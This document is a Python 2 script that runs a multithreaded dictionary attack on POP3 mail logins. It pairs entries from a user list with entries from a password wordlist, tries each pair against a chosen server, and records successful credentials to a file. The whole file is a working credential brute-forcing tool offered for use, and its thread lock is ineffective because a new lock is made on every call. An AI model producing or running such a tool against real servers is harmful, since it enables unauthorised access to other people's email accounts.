import threading, time, random, sys, poplib
from copy import copy

wordlist = []
words = []
users = []
popserver = ""
outputFilename = ""

def reloader():
	global wordlist
	global words
	for word in wordlist:
		words.append(word)

def getword():
	global wordlist
	global words
	global users
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			
			print "User:",user,"Password:",value
			pop = poplib.POP3(popserver)
			pop.user(user)
			pop.pass_(value)
			print "\t\nLogin successful:",value, user
			with open(outputFilename,"a+") as outputFile:
				outputFile.write("login Success to '%s': %s - %s\n" % (popserver,user,value))
			print pop.stat()
			pop.quit()
			# self.join()
			sys.exit(2)
		except (poplib.error_proto), msg: 
			# with open(outputFilename,"a+") as outputFile:
			# 	outputFile.write("Login Fail: %s - %s" % (user,value))
			pass

def execute(p_popserver,usersListFilename,wordListFilename, p_outputFilename):
	print "execute"
	global wordlist
	global words
	global users
	global popserver
	global outputFilename
	outputFilename = p_outputFilename
	popserver = p_popserver
	try:
	  	users = open(usersListFilename, "r").readlines()
	except(IOError): 
	  	print "Error: Check your userlist path\n"
	  	sys.exit(1)
	  
	try:
	  	words = open(wordListFilename, "r").readlines()
	except(IOError): 
	  	print "Error: Check your wordlist path\n"
	  	sys.exit(1)
		
	try:
		pop = poplib.POP3(popserver)
		welcome = pop.getwelcome()
		pop.quit()
	except (poplib.error_proto): 
		welcome = "No Response"
		pass
	wordlist = copy(words)
	for i in range(len(words)*len(users)):
		work = Worker()
		work.start()
		time.sleep(0.01)




